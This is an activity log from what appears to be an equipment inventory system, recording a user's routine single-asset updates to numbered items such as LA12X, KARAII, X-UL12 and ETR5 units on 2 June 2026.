2026/06/02 19:48:43,bnjm2000,Updated asset MASTER4KTX#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:48:43,bnjm2000,Updated asset MASTER4KRX#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:48:43,bnjm2000,Updated asset MASTER4KRX#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:48:43,bnjm2000,Updated asset MASTER4KRX#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:49:39,bnjm2000,Updated asset ISOG2#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:07,bnjm2000,Updated asset LA12X#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:07,bnjm2000,Updated asset LA12X#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:07,bnjm2000,Updated asset LA12X#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:07,bnjm2000,Updated asset LA12X#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:08,bnjm2000,Updated asset LA12X#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:08,bnjm2000,Updated asset LA12X#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:08,bnjm2000,Updated asset LA12X#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:08,bnjm2000,Updated asset LA12X#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:09,bnjm2000,Updated asset KARAII#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:09,bnjm2000,Updated asset KARAII#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:09,bnjm2000,Updated asset KARAII#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:09,bnjm2000,Updated asset KARAII#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:10,bnjm2000,Updated asset KARAII#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:10,bnjm2000,Updated asset KARAII#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:10,bnjm2000,Updated asset KARAII#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:10,bnjm2000,Updated asset KARAII#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:11,bnjm2000,Updated asset KARAII#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:11,bnjm2000,Updated asset KARAII#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:11,bnjm2000,Updated asset KARAII#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:11,bnjm2000,Updated asset KARAII#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:11,bnjm2000,Updated asset KARAII#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:12,bnjm2000,Updated asset KARAII#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:12,bnjm2000,Updated asset KARAII#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:12,bnjm2000,Updated asset KARAII#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:12,bnjm2000,Updated asset MBUMP#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:07:13,bnjm2000,Updated asset MBUMP#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:29,bnjm2000,Updated asset LA4X#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:29,bnjm2000,Updated asset LA4X#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:29,bnjm2000,Updated asset LA4X#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:30,bnjm2000,Updated asset LA4X#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:30,bnjm2000,Updated asset LA4X#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:30,bnjm2000,Updated asset LA4X#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:30,bnjm2000,Updated asset LA4X#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:31,bnjm2000,Updated asset LA4X#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:31,bnjm2000,Updated asset LA4X#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:31,bnjm2000,Updated asset LA4X#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:31,bnjm2000,Updated asset SB18#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:31,bnjm2000,Updated asset SB18#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:32,bnjm2000,Updated asset SB18#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:32,bnjm2000,Updated asset SB18#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:32,bnjm2000,Updated asset SB18#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:32,bnjm2000,Updated asset SB18#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:33,bnjm2000,Updated asset SB18#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:33,bnjm2000,Updated asset SB18#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:33,bnjm2000,Updated asset X-UL12#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:33,bnjm2000,Updated asset X-UL12#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:34,bnjm2000,Updated asset X-UL12#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:34,bnjm2000,Updated asset X-UL12#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:34,bnjm2000,Updated asset X-UL12#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:34,bnjm2000,Updated asset X-UL12#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:35,bnjm2000,Updated asset X-UL12#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:35,bnjm2000,Updated asset X-UL12#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:35,bnjm2000,Updated asset X-UL12#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:35,bnjm2000,Updated asset X-UL12#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:35,bnjm2000,Updated asset X-UL12#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:36,bnjm2000,Updated asset X-UL12#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:36,bnjm2000,Updated asset X-UL12#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:36,bnjm2000,Updated asset X-UL12#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:36,bnjm2000,Updated asset X-UL12#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:37,bnjm2000,Updated asset X-UL12#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:37,bnjm2000,Updated asset X-US1215#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:37,bnjm2000,Updated asset X-US1215#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:37,bnjm2000,Updated asset X-US1215#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:38,bnjm2000,Updated asset X-US1215#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:38,bnjm2000,Updated asset X-US1215#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:38,bnjm2000,Updated asset X-US1215#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:38,bnjm2000,Updated asset X-US1215#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:39,bnjm2000,Updated asset X-US1215#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:39,bnjm2000,Updated asset X-US1215#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:39,bnjm2000,Updated asset X-US1215#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:39,bnjm2000,Updated asset X-US1215#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:39,bnjm2000,Updated asset X-US1215#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:40,bnjm2000,Updated asset X-US1215#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:40,bnjm2000,Updated asset X-US1215#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:40,bnjm2000,Updated asset X-US1215#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:40,bnjm2000,Updated asset X-US1215#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:41,bnjm2000,Updated asset X-UL8#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:41,bnjm2000,Updated asset X-UL8#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:41,bnjm2000,Updated asset X-UL8#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:41,bnjm2000,Updated asset X-UL8#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:42,bnjm2000,Updated asset X-UL8#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:42,bnjm2000,Updated asset X-UL8#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:42,bnjm2000,Updated asset X-UL8#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:42,bnjm2000,Updated asset X-UL8#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:42,bnjm2000,Updated asset X-UL8#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:43,bnjm2000,Updated asset X-UL8#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:43,bnjm2000,Updated asset X-UL8#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:43,bnjm2000,Updated asset X-UL8#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:43,bnjm2000,Updated asset X-US8#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:44,bnjm2000,Updated asset X-US8#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:44,bnjm2000,Updated asset X-US8#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:44,bnjm2000,Updated asset X-US8#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:44,bnjm2000,Updated asset X-US8#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:44,bnjm2000,Updated asset X-US8#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:45,bnjm2000,Updated asset X-US8#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:45,bnjm2000,Updated asset X-US8#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:45,bnjm2000,Updated asset X-US8#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:45,bnjm2000,Updated asset X-US8#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:46,bnjm2000,Updated asset X-US8#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:46,bnjm2000,Updated asset X-US8#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:46,bnjm2000,Updated asset X12#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:46,bnjm2000,Updated asset X12#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:47,bnjm2000,Updated asset X12#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:47,bnjm2000,Updated asset X12#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:47,bnjm2000,Updated asset X12#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:47,bnjm2000,Updated asset X12#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:47,bnjm2000,Updated asset X12#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:48,bnjm2000,Updated asset X12#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:48,bnjm2000,Updated asset X12#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:48,bnjm2000,Updated asset X12#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:48,bnjm2000,Updated asset X12#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:49,bnjm2000,Updated asset X12#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:49,bnjm2000,Updated asset X12#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:49,bnjm2000,Updated asset X12#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:49,bnjm2000,Updated asset X12#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:50,bnjm2000,Updated asset X12#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:50,bnjm2000,Updated asset X8#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:50,bnjm2000,Updated asset X8#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:50,bnjm2000,Updated asset X8#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:50,bnjm2000,Updated asset X8#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:51,bnjm2000,Updated asset X8#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:51,bnjm2000,Updated asset X8#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:51,bnjm2000,Updated asset X8#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:51,bnjm2000,Updated asset X8#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:52,bnjm2000,Updated asset X8#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:52,bnjm2000,Updated asset X8#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:52,bnjm2000,Updated asset X8#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:52,bnjm2000,Updated asset X8#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:53,bnjm2000,Updated asset X8#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:53,bnjm2000,Updated asset X8#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:53,bnjm2000,Updated asset X8#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:08:53,bnjm2000,Updated asset X8#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:44,bnjm2000,Updated asset LA12X#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:44,bnjm2000,Updated asset LA12X#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:44,bnjm2000,Updated asset LA12X#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:44,bnjm2000,Updated asset LA12X#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:45,bnjm2000,Updated asset LA12X#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:45,bnjm2000,Updated asset LA12X#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:45,bnjm2000,Updated asset LA12X#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:45,bnjm2000,Updated asset LA12X#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:46,bnjm2000,Updated asset KARAII#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:46,bnjm2000,Updated asset KARAII#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:46,bnjm2000,Updated asset KARAII#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:46,bnjm2000,Updated asset KARAII#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:47,bnjm2000,Updated asset KARAII#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:47,bnjm2000,Updated asset KARAII#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:47,bnjm2000,Updated asset KARAII#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:47,bnjm2000,Updated asset KARAII#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:47,bnjm2000,Updated asset KARAII#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:48,bnjm2000,Updated asset KARAII#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:48,bnjm2000,Updated asset KARAII#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:48,bnjm2000,Updated asset KARAII#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:48,bnjm2000,Updated asset KARAII#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:49,bnjm2000,Updated asset KARAII#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:49,bnjm2000,Updated asset KARAII#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:49,bnjm2000,Updated asset KARAII#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:49,bnjm2000,Updated asset MBUMP#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:11:49,bnjm2000,Updated asset MBUMP#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:17:34,bnjm2000,Updated asset DM7#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:18:29,bnjm2000,Updated asset RIO3224-D2 #01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:42,bnjm2000,Updated asset 5XT#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:42,bnjm2000,Updated asset 5XT#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:42,bnjm2000,Updated asset 5XT#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:42,bnjm2000,Updated asset 5XT#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:42,bnjm2000,Updated asset 5XT#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:42,bnjm2000,Updated asset 5XT#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:42,bnjm2000,Updated asset 5XT#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:43,bnjm2000,Updated asset 5XT#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:43,bnjm2000,Updated asset 5XT#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:43,bnjm2000,Updated asset 5XT#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:43,bnjm2000,Updated asset 5XT#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:43,bnjm2000,Updated asset 5XT#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:43,bnjm2000,Updated asset ETR5#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:43,bnjm2000,Updated asset ETR5#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:44,bnjm2000,Updated asset ETR5#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:44,bnjm2000,Updated asset ETR5#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:44,bnjm2000,Updated asset ETR5#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:44,bnjm2000,Updated asset ETR5#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:44,bnjm2000,Updated asset ETR5#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:44,bnjm2000,Updated asset ETR5#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:44,bnjm2000,Updated asset ETR5#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset ETR5#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset ETR5#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset ETR5#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset X-UL12#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset X-UL12#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset X-UL12#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset X-UL12#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset X-UL12#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:45,bnjm2000,Updated asset X-UL12#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:46,bnjm2000,Updated asset X-UL12#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:46,bnjm2000,Updated asset X-UL12#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:46,bnjm2000,Updated asset X-UL12#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:46,bnjm2000,Updated asset X-UL12#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:46,bnjm2000,Updated asset X-UL12#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:46,bnjm2000,Updated asset X-UL12#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:46,bnjm2000,Updated asset X-UL12#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:47,bnjm2000,Updated asset X-UL12#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:47,bnjm2000,Updated asset X-UL12#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:47,bnjm2000,Updated asset X-UL12#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:47,bnjm2000,Updated asset X-US1215#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:47,bnjm2000,Updated asset X-US1215#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:47,bnjm2000,Updated asset X-US1215#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
